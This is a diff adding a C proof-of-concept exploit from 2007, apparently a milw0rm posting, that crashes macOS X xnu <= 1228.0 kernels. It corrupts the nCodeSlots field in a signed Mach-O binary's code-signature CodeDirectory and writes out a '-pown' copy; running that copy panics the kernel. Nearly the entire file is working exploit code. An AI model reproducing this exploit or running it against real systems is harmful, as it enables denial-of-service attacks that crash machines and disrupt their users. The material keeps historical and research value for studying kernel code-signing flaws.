@@ -1,0 +1,188 @@
+/* xnu-superblob-dos.c
+ *
+ * Copyright (c) 2007 by <mu-b@digit-labs.org>
+ *
+ * Apple MACOS X xnu <= 1228.0 local kernel DoS POC
+ * by mu-b - Mon 10 Dec 2007
+ *
+ * - Tested on: Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
+ *
+ * assert trip or bcopy (NULL, ....) in cs_validate_page by causing
+ * hashes () to return NULL (there are many ways to do this!).
+ *                                       (bsd/kern/ubc_subr.c)
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <arpa/inet.h>
+#include <fcntl.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+#define MAX_PATH_LEN                128
+
+/* change this value if no panic */
+#define CSLOTS_DIFF                 0x69696969
+
+#define CSSLOT_CODEDIRECTORY        0x0
+#define CSMAGIC_CODEDIRECTORY       0xfade0c02  /* CodeDirectory blob */
+#define CSMAGIC_EMBEDDED_SIGNATURE  0xfade0cc0  /* embedded form of signature data */
+
+/* bsd/kern/ubc_subr.c */
+struct blob_index {
+  unsigned int type;
+  unsigned int offset;
+};
+
+struct super_blob {
+  unsigned int magic;
+  unsigned int length;
+  unsigned int count;
+  struct blob_index index[];
+};
+
+struct code_directory {
+  unsigned int magic;
+  unsigned int length;
+  unsigned int version;
+  unsigned int flags;
+  unsigned int hashOffset;
+  unsigned int identOffset;
+  unsigned int nSpecialSlots;
+  unsigned int nCodeSlots;      /* number of ordinary (code) hash slots */
+  unsigned int codeLimit;
+  unsigned char hashSize;
+  unsigned char hashType;
+  unsigned char spare1;
+  unsigned char pageSize;
+  unsigned int spare2;
+};
+
+static void *
+xmalloc (int num_bytes)
+{
+  char *buf;
+
+  buf = malloc (num_bytes);
+  if (buf == NULL)
+    {
+      fprintf (stderr, "malloc (): out of memory allocating %d-bytes!\n", num_bytes);
+      exit (EXIT_FAILURE);
+    }
+
+  return (buf);
+}
+
+int
+main (int argc, char ** argv)
+{
+  char fnbuf[MAX_PATH_LEN], *ptr, *cur, *end;
+  int fd, wfd, found, size;
+  struct stat fbuf;
+
+  printf ("Apple MACOS X xnu <= 1228.0 local kernel DoS PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");
+
+  if (argc <= 1)
+    {
+      fprintf (stderr, "Usage: %s <signed macho-o binary>\n", argv[0]);
+      exit (EXIT_SUCCESS);
+    }
+
+  if ((fd = open (argv[1], O_RDONLY)) == -1)
+    {
+      perror ("open ()");
+      exit (EXIT_FAILURE);
+    }
+
+  snprintf (fnbuf, sizeof fnbuf, "%s-pown", argv[1]);
+
+  if ((wfd = open (fnbuf, O_RDWR | O_CREAT)) == -1)
+    {
+      perror ("open ()");
+      exit (EXIT_FAILURE);
+    }
+
+  if (fstat (fd, &fbuf) < 0)
+    {
+      perror ("fstat ()");
+      exit (EXIT_FAILURE);
+    }
+
+  size = fbuf.st_size;
+  ptr = xmalloc (sizeof (char) * size);
+  end = ptr + size;
+
+  if (read (fd, ptr, size) < size)
+    {
+      unlink (fnbuf);
+
+      perror ("write ()");
+      exit (EXIT_FAILURE);
+    }
+
+  close (fd);
+
+  for (cur = ptr, found = 0;
+       cur + sizeof (struct super_blob) < end;
+       cur += sizeof (unsigned long))
+    {
+      struct super_blob *blob;
+      int i, magic;
+
+      blob = (struct super_blob *) cur;
+      magic = ntohl (blob->magic);
+
+      if (magic == CSMAGIC_EMBEDDED_SIGNATURE)
+        {
+          for (i = 0; i < ntohl (blob->count); i++)
+            {
+              int type;
+              
+              type = ntohl (blob->index[i].type);
+              if (type == CSSLOT_CODEDIRECTORY)
+                {
+                  struct code_directory *code;
+                  int offset;
+                  
+                  offset = ntohl (blob->index[i].offset);
+                  code = (struct code_directory *) (cur + offset);
+                  magic = ntohl (code->magic);
+                  
+                  if (magic == CSMAGIC_CODEDIRECTORY);
+                    {
+                      printf ("* found at offset @0x%08X\n", (char *) code - ptr);
+                      code->nCodeSlots = htonl (CSLOTS_DIFF);
+                      found = 1;
+                    }
+                }
+            }
+        }
+    }
+
+  if (!found)
+    {
+      unlink (fnbuf);
+
+      fprintf (stderr, "* ARGH! hueristic didn't find our target!\n");
+      exit (EXIT_FAILURE);
+    }
+
+  write (wfd, ptr, size);
+  fchmod(wfd, fbuf.st_mode);
+  close (wfd);
+
+  free (ptr);
+  fprintf (stdout, "* done\nexecute ./%s at your own risk!$%%!\n", fnbuf);
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2007-12-12]
